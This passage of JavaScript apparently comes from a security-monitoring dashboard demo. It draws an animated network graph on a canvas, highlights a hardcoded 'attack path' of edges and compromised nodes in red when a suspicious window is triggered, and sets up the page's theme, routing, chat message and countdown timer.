    for (let index = 0; index < members.length - 1; index++) {
      addEdge(members[index], members[index + 1], 0.38 + (index % 3) * 0.08);
    }
    for (let index = 0; index < members.length - 3; index += 2) {
      addEdge(members[index], members[index + 3], 0.36 + (index % 2) * 0.06);
    }
  });
  [
    [0, 1, 0.92], [0, 7, 0.84], [1, 3, 0.96], [1, 9, 0.72], [1, 10, 0.7],
    [2, 3, 0.88], [2, 5, 0.74], [2, 9, 0.78], [3, 6, 0.95], [3, 7, 0.93],
    [3, 10, 0.8], [4, 5, 0.94], [4, 8, 0.82], [5, 8, 0.91], [6, 7, 0.9],
    [6, 5, 0.76], [6, 10, 0.72], [7, 5, 0.82], [7, 9, 0.86], [9, 10, 0.84],
    [9, 11, 0.82], [10, 11, 0.72], [11, 3, 0.68], [8, 9, 0.64], [5, 9, 0.62],
    [6, 9, 0.66], [1, 5, 0.74], [3, 4, 0.7], [7, 11, 0.64], [2, 10, 0.62]
  ].forEach(([a, b, weight]) => addEdge(a, b, weight));
  const fillToTarget = (membersA, membersB, weightBase) => {
    let cursor = 0;
    while (edgeList.length < 96 && cursor < 200) {
      const a = membersA[cursor % membersA.length];
      const b = membersB[(cursor * 3 + 2) % membersB.length];
      addEdge(a, b, weightBase + ((cursor % 4) * 0.05));
      cursor++;
    }
  };
  fillToTarget(clusterMembers.user, clusterMembers.core, 0.44);
  fillToTarget(clusterMembers.core, clusterMembers.data, 0.46);
  fillToTarget(clusterMembers.core, clusterMembers.external, 0.48);
  fillToTarget(clusterMembers.data, clusterMembers.external, 0.42);
  const edges = edgeList.slice(0, 96);
  const attackPathEdges = {
    7: [12, 13, 0.97],
    29: [13, 7, 0.99],
    58: [7, 14, 0.95]
  };
  Object.entries(attackPathEdges).forEach(([index, edge]) => {
    edges[Number(index)] = edge;
  });
  const attackNodeSet = new Set([12, 13, 7, 14]);
  let tick = 0;
  function size() {
    const box = canvas.getBoundingClientRect();
    const width = Math.max(720, box.width || canvas.parentElement.clientWidth || 900);
    const height = Math.max(520, box.height || canvas.parentElement.clientHeight || 560);
    const ratio = Math.min(devicePixelRatio || 1, 2);
    canvas.width = width * ratio;
    canvas.height = height * ratio;
    ctx.setTransform(ratio, 0, 0, ratio, 0, 0);
  }
  function draw() {
    const width = canvas.width / Math.min(devicePixelRatio || 1, 2);
    const height = canvas.height / Math.min(devicePixelRatio || 1, 2);
    const minX = 0.09;
    const maxX = 0.91;
    const minY = 0.11;
    const maxY = 0.89;
    tick += 0.01;
    ctx.clearRect(0, 0, width, height);
    ctx.fillStyle = getComputedStyle(document.body).getPropertyValue("--chart-bg").trim() || "#03060B";
    ctx.fillRect(0, 0, width, height);
    const clusterGlow = [
      [0.18, 0.28, 170, "rgba(104, 225, 253, 0.045)"],
      [0.49, 0.32, 180, "rgba(74, 116, 167, 0.05)"],
      [0.34, 0.72, 160, "rgba(88, 214, 141, 0.045)"],
      [0.76, 0.66, 170, "rgba(246, 200, 95, 0.04)"]
    ];
    clusterGlow.forEach(([x, y, radius, color]) => {
      const gradient = ctx.createRadialGradient(x * width, y * height, 0, x * width, y * height, radius);
      gradient.addColorStop(0, color);
      gradient.addColorStop(1, "rgba(0,0,0,0)");
      ctx.fillStyle = gradient;
      ctx.beginPath();
      ctx.arc(x * width, y * height, radius, 0, Math.PI * 2);
      ctx.fill();
    });
    nodes.forEach((node) => {
      const swayX = Math.sin(tick + node.y * 6 + node.phase) * 0.0008;
      const swayY = Math.cos(tick + node.x * 6 + node.phase) * 0.0008;
      node.x += node.vx + swayX;
      node.y += node.vy + swayY;
      if (node.x < minX) {
        node.x = minX;
        node.vx = Math.abs(node.vx);
      }
      if (node.x > maxX) {
        node.x = maxX;
        node.vx = -Math.abs(node.vx);
      }
      if (node.y < minY) {
        node.y = minY;
        node.vy = Math.abs(node.vy);
      }
      if (node.y > maxY) {
        node.y = maxY;
        node.vy = -Math.abs(node.vy);
      }
    });
    const attackPulse = (Math.sin(tick * 6) + 1) / 2;
    edges.forEach(([a, b, weight], index) => {
      const from = nodes[a];
      const to = nodes[b];
      const alert = state.suspicious && (index === 7 || index === 29 || index === 58);
      ctx.strokeStyle = alert ? "#FF5F6D" : "#58D68D";
      ctx.globalAlpha = alert ? 0.9 + attackPulse * 0.08 : state.suspicious ? 0.05 + weight * 0.1 : 0.12 + weight * 0.18;
      ctx.lineWidth = alert ? 2.8 + attackPulse * 1.4 : 0.75 + weight;
      if (alert) {
        ctx.shadowColor = "rgba(255, 95, 109, 0.45)";
        ctx.shadowBlur = 7 + attackPulse * 5;
      } else {
        ctx.shadowBlur = 0;
      }
      ctx.beginPath();
      ctx.moveTo(from.x * width, from.y * height);
      ctx.lineTo(to.x * width, to.y * height);
      ctx.stroke();
      if (alert) {
        const travel = ((tick * 0.78) + index * 0.19) % 1;
        const px = from.x * width + (to.x - from.x) * width * travel;
        const py = from.y * height + (to.y - from.y) * height * travel;
        const gradient = ctx.createRadialGradient(px, py, 0, px, py, 10);
        gradient.addColorStop(0, "rgba(255, 145, 145, 0.82)");
        gradient.addColorStop(0.45, "rgba(255, 95, 109, 0.5)");
        gradient.addColorStop(1, "rgba(255, 95, 109, 0)");
        ctx.fillStyle = gradient;
        ctx.globalAlpha = 1;
        ctx.beginPath();
        ctx.arc(px, py, 10, 0, Math.PI * 2);
        ctx.fill();
        ctx.fillStyle = "#FFD7D7";
        ctx.beginPath();
        ctx.arc(px, py, 2.8 + attackPulse, 0, Math.PI * 2);
        ctx.fill();
      }
    });
    ctx.shadowBlur = 0;
    nodes.forEach((node, index) => {
      const x = node.x * width;
      const y = node.y * height;
      const compromised = state.suspicious && attackNodeSet.has(index);
      const radius = compromised ? 7 : node.important ? 5 : 3;
      if (node.important || compromised) {
        const aura = ctx.createRadialGradient(x, y, 0, x, y, compromised ? 16 : 15);
        aura.addColorStop(0, compromised ? "rgba(255, 95, 109, 0.32)" : "rgba(104, 225, 253, 0.35)");
        aura.addColorStop(1, "rgba(0,0,0,0)");
        ctx.fillStyle = aura;
        ctx.beginPath();
        ctx.arc(x, y, compromised ? 16 : 15, 0, Math.PI * 2);
        ctx.fill();
      }
      ctx.globalAlpha = 1;
      ctx.fillStyle = compromised ? "#FF5F6D" : node.important ? "#68E1FD" : "#4A74A7";
      ctx.strokeStyle = compromised ? "#FFD6D6" : "rgba(220, 234, 247, 0.78)";
      ctx.lineWidth = compromised ? 1.6 + attackPulse * 0.6 : node.important ? 1.4 : 0;
      ctx.beginPath();
      ctx.arc(x, y, radius, 0, Math.PI * 2);
      ctx.fill();
      if (node.important || compromised) ctx.stroke();
      if (node.important) {
        ctx.font = "600 12px Inter, sans-serif";
        const labelWidth = ctx.measureText(node.label).width;
        const pillWidth = labelWidth + 14;
        const pillHeight = 20;
        const offsetX = x > width - 140 ? -(pillWidth + 12) : 12;
        const offsetY = y < 30 ? 12 : -22;
        const labelX = clamp(x + offsetX, 8, width - pillWidth - 8);
        const labelY = clamp(y + offsetY, 8, height - pillHeight - 8);
        ctx.globalAlpha = 0.95;
        ctx.fillStyle = "rgba(6, 12, 20, 0.82)";
        ctx.shadowColor = "rgba(0, 0, 0, 0.35)";
        ctx.shadowBlur = 10;
        ctx.beginPath();
        ctx.roundRect(labelX, labelY, pillWidth, pillHeight, 10);
        ctx.fill();
        ctx.shadowBlur = 0;
        ctx.strokeStyle = compromised ? "rgba(255, 95, 109, 0.7)" : "rgba(104, 225, 253, 0.26)";
        ctx.lineWidth = 1;
        ctx.stroke();
        ctx.fillStyle = getComputedStyle(document.body).getPropertyValue("--text").trim() || "#F4F9FF";
        ctx.textBaseline = "middle";
        ctx.fillText(node.label, labelX + 7, labelY + pillHeight / 2 + 0.5);
      }
    });
    ctx.globalAlpha = 1;
    requestAnimationFrame(draw);
  }
  size();
  state.graphResize = size;
  addEventListener("resize", size);
  draw();
}

function init() {
  document.body.classList.toggle("dark", state.dark);
  $("#themeToggle").textContent = state.dark ? "Light mode" : "Dark mode";
  routeTo(location.hash.replace("#", "") || "home");
  renderAll();
  bindEvents();
  addChat("Current one-hour window is normal. I will flag the next suspicious window when it arrives.");
  startHeroCanvas();
  startBehaviourGraph();
  setInterval(updateCountdown, 1000);
  setTimeout(triggerSuspicious, Math.max(0, nextSuspiciousTime.getTime() - Date.now()));
  requestAnimationFrame(() => $("#loader").classList.add("hidden"));
}

init();